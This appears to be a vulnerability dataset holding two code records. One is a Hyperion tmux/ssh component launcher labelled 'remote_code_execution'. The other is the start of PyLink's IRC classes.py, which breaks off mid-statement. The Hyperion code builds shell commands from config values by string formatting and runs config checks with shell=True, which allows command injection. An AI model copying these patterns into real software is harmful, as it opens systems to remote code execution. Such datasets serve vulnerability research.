SCRIPT_CLONE_PATH = (""%s/scripts/start_named_clone_session.sh"" % BASE_DIR)


class CheckState(Enum):
    RUNNING = 0
    STOPPED = 1
    STOPPED_BUT_SUCCESSFUL = 2
    STARTED_BY_HAND = 3
    DEP_FAILED = 4


class ControlCenter:

    def __init__(self, configfile=None):
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        self.configfile = configfile
        self.nodes = {}
        self.server = []
        self.host_list = []

        if configfile:
            self.load_config(configfile)
            self.session_name = self.config[""name""]

            # Debug write resulting yaml file
            with open('debug-result.yml', 'w') as outfile:
                dump(self.config, outfile, default_flow_style=False)
            self.logger.debug(""Loading config was successful"")

            self.server = Server()

            if self.server.has_session(self.session_name):
                self.session = self.server.find_where({
                    ""session_name"": self.session_name
                })

                self.logger.info('found running session by name ""%s"" on server' % self.session_name)
            else:
                self.logger.info('starting new session by name ""%s"" on server' % self.session_name)
                self.session = self.server.new_session(
                    session_name=self.session_name,
                    window_name=""Main""
                )
        else:
            self.config = None

    ###################
    # Setup
    ###################
    def load_config(self, filename=""default.yaml""):
        with open(filename) as data_file:
            self.config = load(data_file, Loader)

    def init(self):
        if not self.config:
            self.logger.error("" Config not loaded yet!"")

        else:
            for group in self.config['groups']:
                for comp in group['components']:
                    self.logger.debug(""Checking component '%s' in group '%s' on host '%s'"" %
                                      (comp['name'], group['name'], comp['host']))

                    if comp['host'] != ""localhost"" and not self.run_on_localhost(comp):
                        self.copy_component_to_remote(comp, comp['name'], comp['host'])

            # Remove duplicate hosts
            self.host_list = list(set(self.host_list))

            self.set_dependencies(True)

    def set_dependencies(self, exit_on_fail):
        for group in self.config['groups']:
            for comp in group['components']:
                self.nodes[comp['name']] = Node(comp)

        # Add a pseudo node that depends on all other nodes, to get a starting point to be able to iterate through all
        # nodes with simple algorithms
        master_node = Node({'name': 'master_node'})
        for name in self.nodes:
            node = self.nodes.get(name)

            # Add edges from each node to pseudo node
            master_node.addEdge(node)

            # Add edges based on dependencies specified in the configuration
            if ""depends"" in node.component:
                for dep in node.component['depends']:
                    if dep in self.nodes:
                        node.addEdge(self.nodes[dep])
                    else:
                        self.logger.error(""Unmet dependency: '%s' for component '%s'!"" % (dep, node.comp_name))
                        if exit_on_fail:
                            exit(1)
        self.nodes['master_node'] = master_node

        # Test if starting all components is possible
        try:
            node = self.nodes.get('master_node')
            res = []
            unres = []
            dep_resolve(node, res, unres)
            dep_string = """"
            for node in res:
                if node is not master_node:
                    dep_string = ""%s -> %s"" % (dep_string, node.comp_name)
            self.logger.debug(""Dependency tree for start all: %s"" % dep_string)
        except CircularReferenceException as ex:
            self.logger.error(""Detected circular dependency reference between %s and %s!"" % (ex.node1, ex.node2))
            if exit_on_fail:
                exit(1)

    def copy_component_to_remote(self, infile, comp, host):
        self.host_list.append(host)

        self.logger.debug(""Saving component to tmp"")
        tmp_comp_path = ('%s/%s.yaml' % (TMP_COMP_DIR, comp))
        ensure_dir(tmp_comp_path)
        with open(tmp_comp_path, 'w') as outfile:
            dump(infile, outfile, default_flow_style=False)

        self.logger.debug('Copying component ""%s"" to remote host ""%s""' % (comp, host))
        cmd = (""ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml"" %
               (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp))
        self.logger.debug(cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Stop
    ###################
    def stop_component(self, comp):
        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):
            self.logger.debug(""Stopping remote component '%s' on host '%s'"" % (comp['name'], comp['host']))
            self.stop_remote_component(comp['name'], comp['host'])
        else:
            window = find_window(self.session, comp['name'])

            if window:
                self.logger.debug(""window '%s' found running"" % comp['name'])
                self.logger.info(""Shutting down window..."")
                kill_window(window)
                self.logger.info(""... done!"")

    def stop_remote_component(self, comp_name, host):
        # invoke Hyperion in slave mode on each remote host
        cmd = (""ssh %s 'hyperion --config %s/%s.yaml slave --kill'"" % (host, TMP_SLAVE_DIR, comp_name))
        self.logger.debug(""Run cmd:\n%s"" % cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Start
    ###################
    def start_component(self, comp):

        node = self.nodes.get(comp['name'])
        res = []
        unres = []
        dep_resolve(node, res, unres)
        for node in res:
            self.logger.debug(""node name '%s' vs. comp name '%s'"" % (node.comp_name, comp['name']))
            if node.comp_name != comp['name']:
                self.logger.debug(""Checking and starting %s"" % node.comp_name)
                state = self.check_component(node.component)
                if (state is CheckState.STOPPED_BUT_SUCCESSFUL or
                        state is CheckState.STARTED_BY_HAND or
                        state is CheckState.RUNNING):
                    self.logger.debug(""Component %s is already running, skipping to next in line"" % comp['name'])
                else:
                    self.logger.debug(""Start component '%s' as dependency of '%s'"" % (node.comp_name, comp['name']))
                    self.start_component_without_deps(node.component)

                    tries = 0
                    while True:
                        self.logger.debug(""Checking %s resulted in checkstate %s"" % (node.comp_name, state))
                        state = self.check_component(node.component)
                        if (state is not CheckState.RUNNING or
                           state is not CheckState.STOPPED_BUT_SUCCESSFUL):
                            break
                        if tries > 100:
                            return False
                        tries = tries + 1
                        sleep(.5)

        self.logger.debug(""All dependencies satisfied, starting '%s'"" % (comp['name']))
        state = self.check_component(node.component)
        if (state is CheckState.STARTED_BY_HAND or
                state is CheckState.RUNNING):
            self.logger.debug(""Component %s is already running. Skipping start"" % comp['name'])
        else:
            self.start_component_without_deps(comp)
        return True

    def start_component_without_deps(self, comp):
        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):
            self.logger.debug(""Starting remote component '%s' on host '%s'"" % (comp['name'], comp['host']))
            self.start_remote_component(comp['name'], comp['host'])
        else:
            log_file = (""%s/%s"" % (TMP_LOG_PATH, comp['name']))
            window = find_window(self.session, comp['name'])

            if window:
                self.logger.debug(""Restarting '%s' in old window"" % comp['name'])
                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])
            else:
                self.logger.info(""creating window '%s'"" % comp['name'])
                window = self.session.new_window(comp['name'])
                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])

    def start_remote_component(self, comp_name, host):
        # invoke Hyperion in slave mode on each remote host
        cmd = (""ssh %s 'hyperion --config %s/%s.yaml slave'"" % (host, TMP_SLAVE_DIR, comp_name))
        self.logger.debug(""Run cmd:\n%s"" % cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Check
    ###################
    def check_component(self, comp):
        return check_component(comp, self.session, self.logger)

    ###################
    # Dependency management
    ###################
    def get_dep_list(self, comp):
        node = self.nodes.get(comp['name'])
        res = []
        unres = []
        dep_resolve(node, res, unres)
        res.remove(node)

        return res

    ###################
    # Host related checks
    ###################
    def is_localhost(self, hostname):
        try:
            hn_out = socket.gethostbyname(hostname)
            if hn_out == '127.0.0.1' or hn_out == '::1':
                self.logger.debug(""Host '%s' is localhost"" % hostname)
                return True
            else:
                self.logger.debug(""Host '%s' is not localhost"" % hostname)
                return False
        except socket.gaierror:
            sys.exit(""Host '%s' is unknown! Update your /etc/hosts file!"" % hostname)

    def run_on_localhost(self, comp):
        return self.is_localhost(comp['host'])

    ###################
    # TMUX
    ###################
    def kill_remote_session_by_name(self, name, host):
        cmd = ""ssh -t %s 'tmux kill-session -t %s'"" % (host, name)
        send_main_session_command(self.session, cmd)

    def start_clone_session(self, comp_name, session_name):
        cmd = ""%s '%s' '%s'"" % (SCRIPT_CLONE_PATH, session_name, comp_name)
        send_main_session_command(self.session, cmd)

    def start_remote_clone_session(self, comp_name, session_name, hostname):
        remote_cmd = (""%s '%s' '%s'"" % (SCRIPT_CLONE_PATH, session_name, comp_name))
        cmd = ""ssh %s 'bash -s' < %s"" % (hostname, remote_cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Visualisation
    ###################
    def draw_graph(self):
        deps = Digraph(""Deps"", strict=True)
        deps.graph_attr.update(rankdir=""BT"")
        try:
            node = self.nodes.get('master_node')

            for current in node.depends_on:
                deps.node(current.comp_name)

                res = []
                unres = []
                dep_resolve(current, res, unres)
                for node in res:
                    if ""depends"" in node.component:
                        for dep in node.component['depends']:
                            if dep not in self.nodes:
                                deps.node(dep, color=""red"")
                                deps.edge(node.comp_name, dep, ""missing"", color=""red"")
                            elif node.comp_name is not ""master_node"":
                                deps.edge(node.comp_name, dep)

        except CircularReferenceException as ex:
            self.logger.error(""Detected circular dependency reference between %s and %s!"" % (ex.node1, ex.node2))
            deps.edge(ex.node1, ex.node2, ""circular error"", color=""red"")
            deps.edge(ex.node2, ex.node1, color=""red"")

        deps.view()


class SlaveLauncher:

    def __init__(self, configfile=None, kill_mode=False, check_mode=False):
        self.kill_mode = kill_mode
        self.check_mode = check_mode
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        self.config = None
        self.session = None
        if kill_mode:
            self.logger.info(""started slave with kill mode"")
        if check_mode:
            self.logger.info(""started slave with check mode"")
        self.server = Server()

        if self.server.has_session(""slave-session""):
            self.session = self.server.find_where({
                ""session_name"": ""slave-session""
            })

            self.logger.info('found running slave session on server')
        elif not kill_mode and not check_mode:
            self.logger.info('starting new slave session on server')
            self.session = self.server.new_session(
                session_name=""slave-session""
            )

        else:
            self.logger.info(""No slave session found on server. Aborting"")
            exit(CheckState.STOPPED)

        if configfile:
            self.load_config(configfile)
            self.window_name = self.config['name']
            self.flag_path = (""/tmp/Hyperion/slaves/%s"" % self.window_name)
            self.log_file = (""/tmp/Hyperion/log/%s"" % self.window_name)
            ensure_dir(self.log_file)
        else:
            self.logger.error(""No slave component config provided"")

    def load_config(self, filename=""default.yaml""):
        with open(filename) as data_file:
            self.config = load(data_file, Loader)

    def init(self):
        if not self.config:
            self.logger.error("" Config not loaded yet!"")
        elif not self.session:
            self.logger.error("" Init aborted. No session was found!"")
        else:
            self.logger.debug(self.config)
            window = find_window(self.session, self.window_name)

            if window:
                self.logger.debug(""window '%s' found running"" % self.window_name)
                if self.kill_mode:
                    self.logger.info(""Shutting down window..."")
                    kill_window(window)
                    self.logger.info(""... done!"")
            elif not self.kill_mode:
                self.logger.info(""creating window '%s'"" % self.window_name)
                window = self.session.new_window(self.window_name)
                start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name)

            else:
                self.logger.info(""There is no component running by the name '%s'. Exiting kill mode"" %
                                 self.window_name)

    def run_check(self):
        if not self.config:
            self.logger.error("" Config not loaded yet!"")
            exit(CheckState.STOPPED.value)
        elif not self.session:
            self.logger.error("" Init aborted. No session was found!"")
            exit(CheckState.STOPPED.value)

        check_state = check_component(self.config, self.session, self.logger)
        exit(check_state.value)

###################
# Component Management
###################
def run_component_check(comp):
    if call(comp['cmd'][1]['check'], shell=True) == 0:
        return True
    else:
        return False


def check_component(comp, session, logger):
    logger.debug(""Running component check for %s"" % comp['name'])
    check_available = len(comp['cmd']) > 1 and 'check' in comp['cmd'][1]
    window = find_window(session, comp['name'])
    if window:
        pid = get_window_pid(window)
        logger.debug(""Found window pid: %s"" % pid)

        # May return more child pids if logging is done via tee (which then was started twice in the window too)
        procs = []
        for entry in pid:
            procs.extend(Process(entry).children(recursive=True))
        pids = [p.pid for p in procs]
        logger.debug(""Window is running %s child processes"" % len(pids))

        # Two processes are tee logging
        # TODO: Change this when more logging options are introduced
        if len(pids) < 3:
            logger.debug(""Main window process has finished. Running custom check if available"")
            if check_available and run_component_check(comp):
                logger.debug(""Process terminated but check was successful"")
                return CheckState.STOPPED_BUT_SUCCESSFUL
            else:
                logger.debug(""Check failed or no check available: returning false"")
                return CheckState.STOPPED
        elif check_available and run_component_check(comp):
            logger.debug(""Check succeeded"")
            return CheckState.RUNNING
        elif not check_available:
            logger.debug(""No custom check specified and got sufficient pid amount: returning true"")
            return CheckState.RUNNING
        else:
            logger.debug(""Check failed: returning false"")
            return CheckState.STOPPED
    else:
        logger.debug(""%s window is not running. Running custom check"" % comp['name'])
        if check_available and run_component_check(comp):
            logger.debug(""Component was not started by Hyperion, but the check succeeded"")
            return CheckState.STARTED_BY_HAND
        else:
            logger.debug(""Window not running and no check command is available or it failed: returning false"")
            return CheckState.STOPPED


def get_window_pid(window):
    r = window.cmd('list-panes',
                   ""-F #{pane_pid}"")
    return [int(p) for p in r.stdout]

###################
# TMUX
###################
def kill_session_by_name(server, name):
    session = server.find_where({
        ""session_name"": name
    })
    session.kill_session()


def kill_window(window):
    window.cmd(""send-keys"", """", ""C-c"")
    window.kill_window()


def start_window(window, cmd, log_file, comp_name):
    setup_log(window, log_file, comp_name)
    window.cmd(""send-keys"", cmd, ""Enter"")


def find_window(session, window_name):
    window = session.find_where({
        ""window_name"": window_name
    })
    return window


def send_main_session_command(session, cmd):
    window = find_window(session, ""Main"")
    window.cmd(""send-keys"", cmd, ""Enter"")


###################
# Logging
###################
def setup_log(window, file, comp_name):
    clear_log(file)
    # Reroute stderr to log file
    window.cmd(""send-keys"", ""exec 2> >(exec tee -i -a '%s')"" % file, ""Enter"")
    # Reroute stdin to log file
    window.cmd(""send-keys"", ""exec 1> >(exec tee -i -a '%s')"" % file, ""Enter"")
    window.cmd(""send-keys"", ('echo ""#Hyperion component start: %s\n$(date)""' % comp_name), ""Enter"")


def clear_log(file_path):
    if os.path.isfile(file_path):
        os.remove(file_path)


def ensure_dir(file_path):
    directory = os.path.dirname(file_path)
    if not os.path.exists(directory):
        os.makedirs(directory)

###################
# Startup
###################
def main():
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    parser = argparse.ArgumentParser()

    # Create top level parser
    parser.add_argument(""--config"", '-c', type=str,
                        default='test.yaml',
                        help=""YAML config file. see sample-config.yaml. Default: test.yaml"")
    subparsers = parser.add_subparsers(dest=""cmd"")

    # Create parser for the editor command
    subparser_editor = subparsers.add_parser('edit', help=""Launches the editor to edit or create new systems and ""
                                                          ""components"")
    # Create parser for the run command
    subparser_run = subparsers.add_parser('run', help=""Launches the setup specified by the --config argument"")
    # Create parser for validator
    subparser_val = subparsers.add_parser('validate', help=""Validate the setup specified by the --config argument"")

    subparser_remote = subparsers.add_parser('slave', help=""Run a component locally without controlling it. The ""
                                                           ""control is taken care of the remote master invoking ""
                                                           ""this command.\nIf run with the --kill flag, the ""
                                                           ""passed component will be killed"")

    subparser_val.add_argument(""--visual"", help=""Generate and show a graph image"", action=""store_true"")

    remote_mutex = subparser_remote.add_mutually_exclusive_group(required=False)

    remote_mutex.add_argument('-k', '--kill', help=""switch to kill mode"", action=""store_true"")
    remote_mutex.add_argument('-c', '--check', help=""Run a component check"", action=""store_true"")

    args = parser.parse_args()
    logger.debug(args)

    if args.cmd == 'edit':
        logger.debug(""Launching editor mode"")

    elif args.cmd == 'run':
        logger.debug(""Launching runner mode"")

        cc = ControlCenter(args.config)
        cc.init()
        start_gui(cc)

    elif args.cmd == 'validate':
        logger.debug(""Launching validation mode"")
        cc = ControlCenter(args.config)
        if args.visual:
            cc.set_dependencies(False)
            cc.draw_graph()
        else:
            cc.set_dependencies(True)

    elif args.cmd == 'slave':
        logger.debug(""Launching slave mode"")
        sl = SlaveLauncher(args.config, args.kill, args.check)

        if args.check:
            sl.run_check()
        else:
            sl.init()


###################
# GUI
###################
def start_gui(control_center):
    app = QtGui.QApplication(sys.argv)
    main_window = QtGui.QMainWindow()
    ui = hyperGUI.UiMainWindow()
    ui.ui_init(main_window, control_center)
    main_window.show()
    sys.exit(app.exec_())
/n/n/n",1,remote_code_execution
10,76,9d9b01839cf3639e59d29c27e70688bdbf44db96,"classes.py/n/n""""""
classes.py - Base classes for PyLink IRC Services.

This module contains the base classes used by PyLink, including threaded IRC
connections and objects used to represent IRC servers, users, and channels.

Here be dragons.
""""""

import threading
import time
import socket
import ssl
import hashlib
from copy import deepcopy
import inspect
import re
from collections import defaultdict, deque
import ipaddress

try:
    import ircmatch
except ImportError:
    raise ImportError(""PyLink requires ircmatch to function; please install it and try again."")

from . import world, utils, structures, conf, __version__
from .log import *

### Exceptions

class ProtocolError(RuntimeError):
    pass

### Internal classes (users, servers, channels)

class Irc(utils.DeprecatedAttributesObject):
    """"""Base IRC object for PyLink.""""""

    def __init__(self, netname, proto, conf):
        """"""
        Initializes an IRC object. This takes 3 variables: the network name
        (a string), the name of the protocol module to use for this connection,
        and a configuration object.
        """"""
        self.deprecated_attributes = {
            'conf': 'Deprecated since 1.2; consider switching to conf.conf',
            'botdata': ""Deprecated since 1.2; consider switching to conf.conf['bot']"",
        }

        self.loghandlers = []
        self.name = netname
        self.conf = conf
        self.sid = None
        self.serverdata = conf['servers'][netname]
        self.botdata = conf['bot']
        self.protoname = proto.__name__.split('.')[-1]  # Remove leading pylinkirc.protocols.
        self.proto = proto.Class(self)
        self.pingfreq = self.serverdata.get('pingfreq') or 90
        self.pingtimeout = self.pingfreq * 2

        self.queue = deque()

        self.connected = threading.Event()
        self.aborted = threading.Event()
        self.reply_lock = threading.RLock()

        self.pingTimer = None

        # Sets the multiplier for autoconnect delay (grows with time).
        self.autoconnect_active_multiplier = 1

        self.initVars()

        if world.testing:
            # HACK: Don't thread if we're running tests.
            self.connect()
        else:
            self.connection_thread = threading.Thread(target=self.connect,
                                                      name=""Listener for %s"" %
                                                      self.name)
            self.connection_thread.start()

    def logSetup(self):
        """"""
        Initializes any channel loggers defined for the current network.
        """"""
        try:
            channels = conf.conf['logging']['channels'][self.name]
        except KeyError:  # Not set up; just ignore.
            return

        log.debug('(%s) Setting up channel logging to channels %r', self.name,
                  channels)

        if not self.loghandlers:
            # Only create handlers if they haven't already been set up.

            for channel, chandata in channels.items():
                # Fetch the log level for this channel block.
                level = None
                if chandata is not None:
                    level = chandata.get('loglevel')

                handler = PyLinkChannelLogger(self, channel, level=level)
                self.loghandlers.append(handler)
                log.addHandler(handler)

    def initVars(self):
        """"""
        (Re)sets an IRC object to its default state. This should be called when
        an IRC object is first created, and on every reconnection to a network.
        """"""
        self.pingfreq = self.serverdata.get('pingfreq') or 90
        self.pingtimeout = self.pingfreq * 3

        self.pseudoclient = None
        self.lastping = time.time()

        self.queue.clear()

        # Internal variable to set the place and caller of the last command (in PM
        # or in a channel), used by fantasy command support.
        self.called_by = None
        self.called_in = None

        # Intialize the server, channel, and user indexes to be populated by
        # our protocol module. For the server index, we can add ourselves right
        # now.
        self.servers = {}
        self.users = {}
        self.channels = structures.KeyedDefaultdict(IrcChannel)

        # This sets the list of supported channel and user modes: the default
        # RFC1459 modes are implied. Named modes are used here to make
        # protocol-independent code easier to write, as mode chars vary by
        # IRCd.
        # Protocol modules should add to and/or replace this with what their
        # protocol supports. This can be a hardcoded list or something
        # negotiated on connect, depending on the nature of their protocol.
        self.cmodes = {'op': 'o', 'secret': 's', 'private': 'p',
                       'noextmsg': 'n', 'moderated': 'm', 'inviteonly': 'i',
                       'topiclock': 't', 'limit': 'l', 'ban': 'b',
                       'voice': 'v', 'key': 'k',
                       # This fills in the type of mode each mode character is.
                       # A-type modes are list modes (i.e. bans, ban exceptions, etc.),
                       # B-type modes require an argument to both set and unset,
                       #   but there can only be one value at a time
                       #   (i.e. cmode +k).
                       # C-type modes require an argument to set but not to unset
                       #   (one sets ""+l limit"" and # ""-l""),
                       # and D-type modes take no arguments at all.
                       '*A': 'b',
                       '*B': 'k',
                       '*C': 'l',
                       '*D': 'imnpstr'}
        self.umodes = {'invisible': 'i', 'snomask': 's', 'wallops': 'w',
                       'oper': 'o',
                       '*A': '', '*B': '', '*C': '', '*D': 'iosw'}

        # This max nick length starts off as the config value, but may be
        # overwritten later by the protocol module if such information is
        # received. It defaults to 30.
        self.maxnicklen = self.serverdata.get('maxnicklen', 30)

        # Defines a list of supported prefix modes.
        self.prefixmodes = {'o': '@', 'v': '+'}

        # Defines the uplink SID (to be filled in by protocol module).
        self.uplink = None
        self.start_ts = int(time.time())

        # Set up channel logging for the network
        self.logSetup()

    def processQueue(self):
        """"""Loop to process outgoing queue data.""""""
        while not self.aborted.is_set():
            if self.queue:  # Only process if there's data.
                data = self.queue.popleft()
                self._send(data)
            throttle_time = self.serverdata.get('throttle_time', 0.005)
            self.aborted.wait(throttle_time)
        log.debug('(%s) Stopping queue thread as aborted is set', self.name)

    def connect(self):
        """"""
        Runs the connect loop for the IRC object. This is usually called by
        __init__ in a separate thread to allow multiple concurrent connections.
        """"""
        while True:

            self.aborted.clear()
            self.initVars()

            try:
                self.proto.validateServerConf()
            except AssertionError as e:
                log.exception(""(%s) Configuration error: %s"", self.name, e)
                return

            ip = self.serverdata[""ip""]
            port = self.serverdata[""port""]
            checks_ok = True
            try:
                # Set the socket type (IPv6 or IPv4).
                stype = socket.AF_INET6 if self.serverdata.get(""ipv6"") else socket.AF_INET

                # Creat the socket.
                self.socket = socket.socket(stype)
                self.socket.setblocking(0)

                # Set the socket bind if applicable.
                if 'bindhost' in self.serverdata:
                    self.socket.bind((self.serverdata['bindhost'], 0))

                # Set the connection timeouts. Initial connection timeout is a
                # lot smaller than the timeout after we've connected; this is
                # intentional.
                self.socket.settimeout(self.pingfreq)

                # Resolve hostnames if it's not an IP address already.
                old_ip = ip
                ip = socket.getaddrinfo(ip, port, stype)[0][-1][0]
                log.debug('(%s) Resolving address %s to %s', self.name, old_ip, ip)

                # Enable SSL if set to do so. This requires a valid keyfile and
                # certfile to be present.
                self.ssl = self.serverdata.get('ssl')
                if self.ssl:
                    log.info('(%s) Attempting SSL for this connection...', self.name)
                    certfile = self.serverdata.get('ssl_certfile')
                    keyfile = self.serverdata.get('ssl_keyfile')

                    context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                    # Disable SSLv2 and SSLv3 - these are insecure
                    context.options |= ssl.OP_NO_SSLv2
                    context.options |= ssl.OP_NO_SSLv3

                    if certfile and keyfile:
                        try:
                            context.load_cert_chain(certfile, keyfile)
                        except OSError:
                             log.exception('(%s) Caught OSError trying to '
                                           'initialize the SSL connection; '
                                           'are ""ssl_certfile"" and '
                                           '""ssl_keyfile"" set correctly?',
                                           self.name)
                             checks_ok = False

                    self.socket = context.wrap_socket(self.socket)

                log.info(""Connecting to network %r on %s:%s"", self.name, ip, port)
                self.socket.connect((ip, port))
                self.socket.settimeout(self.pingtimeout)

                # If SSL was enabled, optionally verify the certificate
                # fingerprint for some added security. I don't bother to check
                # the entire certificate for validity, since most IRC networks
                # self-sign their certificates anyways.
                if self.ssl and checks_ok:
                    peercert = self.socket.getpeercert(binary_form=True)

                    # Hash type is configurable using the ssl_fingerprint_type
                    # value, and defaults to sha256.
                    hashtype = self.serverdata.get('ssl_fingerprint_type', 'sha256').lower()

                    try:
                        hashfunc = getattr(hashlib, hashtype)
                    except AttributeError:
                        log.error('(%s) Unsupported SSL certificate fingerprint type %r given, disconnecting...',
                                  self.name, hashtype)
                        checks_ok = False
                    else:
                        fp = hashfunc(peercert).hexdigest()
                        expected_fp = self.serverdata.get('ssl_fingerprint')

                        if expected_fp and checks_ok:
                            if fp != expected_fp:
                                # SSL Fingerprint doesn't match; break.
                                log.error('(%s) Uplink\'s SSL certificate '
                                          'fingerprint (%s) does not match the '
                                          'one configured: expected %r, got %r; '
                                          'disconnecting...', self.name, hashtype,
                                          expected_fp, fp)
                                checks_ok = False
                            else:
                                log.info('(%s) Uplink SSL certificate fingerprint '
                                         '(%s) verified: %r', self.name, hashtype,
                                         fp)
                        else:
                            log.info('(%s) Uplink\'s SSL certificate fingerprint (%s) '
                                     'is %r. You can enhance the security of your '
                                     'link by specifying this in a ""ssl_fingerprint""'
                                     ' option in your server block.', self.name,
                                     hashtype, fp)

                if checks_ok:

                    self.queue_thread = threading.Thread(name=""Queue thread for %s"" % self.name,
                                                         target=self.processQueue, daemon=True)
                    self.queue_thread.start()

                    self.sid = self.serverdata.get(""sid"")
                    # All our checks passed, get the protocol module to connect and run the listen
                    # loop. This also updates any SID values should the protocol module do so.
                    self.proto.connect()

                    log.info('(%s) Enumerating our own SID %s', self.name, self.sid)
                    host = self.hostname()

                    self.servers[self.sid] = IrcServer(None, host, internal=True,
                            desc=self.serverdata.get('serverdesc')
                            or conf.conf['bot']['serverdesc'])

                    log.info('(%s) Starting ping schedulers....', self.name)
                    self.schedulePing()
                    log.info('(%s) Server ready; listening for data.', self.name)
                    self.autoconnect_active_multiplier = 1  # Reset any extra autoconnect delays
                    self.run()
                else:  # Configuration error :(
                    log.error('(%s) A configuration error was encountered '
                              'trying to set up this connection. Please check'
                              ' your configuration file and try again.',
                              self.name)
            # self.run() or the protocol module it called raised an exception, meaning we've disconnected!
            # Note: socket.error, ConnectionError, IOError, etc. are included in OSError since Python 3.3,
            # so we don't need to explicitly catch them here.
            # We also catch SystemExit here as a way to abort out connection threads properly, and stop the
            # IRC connection from freezing instead.
            except (OSError, RuntimeError, SystemExit) as e:
                log.error('(%s) Disconnected from IRC: %s: %s',
                          self.name, type(e).__name__, str(e))

            self.disconnect()

            # If autoconnect is enabled, loop back to the start. Otherwise,
            # return and stop.
            autoconnect = self.serverdata.get('autoconnect')

            # Sets the autoconnect growth multiplier (e.g. a value of 2 multiplies the autoconnect
            # time by 2 on every failure, etc.)
            autoconnect_multiplier = self.serverdata.get('autoconnect_multiplier', 2)
            autoconnect_max = self.serverdata.get('autoconnect_max', 1800)
            # These values must at least be 1.
            autoconnect_multiplier = max(autoconnect_multiplier, 1)
            autoconnect_max = max(autoconnect_max, 1)

            log.debug('(%s) Autoconnect delay set to %s seconds.', self.name, autoconnect)
            if autoconnect is not None and autoconnect >= 1:
                log.debug('(%s) Multiplying autoconnect delay %s by %s.', self.name, autoconnect, self.autoconnect_active_multiplier)
                autoconnect *= self.autoconnect_active_multiplier
                # Add a cap on the max. autoconnect delay, so that we don't go on forever...
                autoconnect = min(autoconnect, autoconnect_max)

                log.info('(%s) Going to auto-reconnect in %s seconds.', self.name, autoconnect)
                # Continue when either self.aborted is set or the autoconnect time passes.
                # Compared to time.sleep(), this allows us to stop connections quicker if we
                # break while while for autoconnect.
                self.aborted.clear()
                self.aborted.wait(autoconnect)

                # Store in the local state what the autoconnect multiplier currently is.
                self.autoconnect_active_multiplier *= autoconnect_multiplier

                if self not in world.networkobjects.values():
                    log.debug('Stopping stale connect loop for old connection %r', self.name)
                    return

            else:
                log.info('(%s) Stopping connect loop (autoconnect value %r is < 1).', self.name, autoconnect)
                return

    def disconnect(self):
        """"""Handle disconnects from the remote server.""""""
        was_successful = self.connected.is_set()
        log.debug('(%s) disconnect: got %s for was_successful state', self.name, was_successful)

        log.debug('(%s) disconnect: Clearing self.connected state.', self.name)
        self.connected.clear()

        log.debug('(%s) Removing channel logging handlers due to disconnect.', self.name)
        while self.loghandlers:
            log.removeHandler(self.loghandlers.pop())

        try:
            log.debug('(%s) disconnect: Shutting down socket.', self.name)
            self.socket.shutdown(socket.SHUT_RDWR)
        except:  # Socket timed out during creation; ignore
            pass

        self.socket.close()

        if self.pingTimer:
            log.debug('(%s) Canceling pingTimer at %s due to disconnect() call', self.name, time.time())
            self.pingTimer.cancel()

        log.debug('(%s) disconnect: Setting self.aborted to True.', self.name)
        self.aborted.set()

        # Internal hook signifying that a network has disconnected.
        self.callHooks([None, 'PYLINK_DISCONNECT', {'was_successful': was_successful}])

        log.debug('(%s) disconnect: Clearing state via initVars().', self.name)
        self.initVars()

    def run(self):
        """"""Main IRC loop which listens for messages.""""""
        # Some magic below cause this to work, though anything that's
        # not encoded in UTF-8 doesn't work very well.
        buf = b""""
        data = b""""
        while not self.aborted.is_set():

            try:
                data = self.socket.recv(2048)
            except OSError:
                # Suppress socket read warnings from lingering recv() calls if
                # we've been told to shutdown.
                if self.aborted.is_set():
                    return
                raise

            buf += data
            if not data:
                log.error('(%s) No data received, disconnecting!', self.name)
                return
            elif (time.time() - self.lastping) > self.pingtimeout:
                log.error('(%s) Connection timed out.', self.name)
                return
            while b'\n' in buf:
                line, buf = buf.split(b'\n', 1)
                line = line.strip(b'\r')
                # FIXME: respect other encodings?
                line = line.decode(""utf-8"", ""replace"")
                self.runline(line)

    def runline(self, line):
        """"""Sends a command to the protocol module.""""""
        log.debug(""(%s) <- %s"", self.name, line)
        try:
            hook_args = self.proto.handle_events(line)
        except Exception:
            log.exception('(%s) Caught error in handle_events, disconnecting!', self.name)
            log.error('(%s) The offending line was: <- %s', self.name, line)
            self.aborted.set()
            return
        # Only call our hooks if there's data to process. Handlers that support
        # hooks will return a dict of parsed arguments, which can be passed on
        # to plugins and the like. For example, the JOIN handler will return
        # something like: {'channel': '#whatever', 'users': ['UID1', 'UID2',
        # 'UID3']}, etc.
        if hook_args is not None:
            self.callHooks(hook_args)

        return hook_args

    def callHooks(self, hook_args):
        """"""Calls a hook function with the given hook args.""""""
        numeric, command, parsed_args = hook_args
        # Always make sure TS is sent.
        if 'ts' not in parsed_args:
            parsed_args['ts'] = int(time.time())
        hook_cmd = command
        hook_map = self.proto.hook_map

        # If the hook name is present in the protocol module's hook_map, then we
        # should set the hook name to the name that points to instead.
        # For example, plugins will read SETHOST as CHGHOST, EOS (end of sync)
        # as ENDBURST, etc.
        if command in hook_map:
            hook_cmd = hook_map[command]

        # However, individual handlers can also return a 'parse_as' key to send
        # their payload to a different hook. An example of this is ""/join 0""
        # being interpreted as leaving all channels (PART).
        hook_cmd = parsed_args.get('parse_as') or hook_cmd

        log.debug('(%s) Raw hook data: [%r, %r, %r] received from %s handler '
                  '(calling hook %s)', self.name, numeric, hook_cmd, parsed_args,
                  command, hook_cmd)

        # Iterate over registered hook functions, catching errors accordingly.
        for hook_func in world.hooks[hook_cmd]:
            try:
                log.debug('(%s) Calling hook function %s from plugin ""%s""', self.name,
                          hook_func, hook_func.__module__)
                hook_func(self, numeric, command, parsed_args)
            except Exception:
                # We don't want plugins to crash our servers...
                log.exception('(%s) Unhandled exception caught in hook %r from plugin ""%s""',
                              self.name, hook_func, hook_func.__module__)
                log.error('(%s) The offending hook data was: %s', self.name,
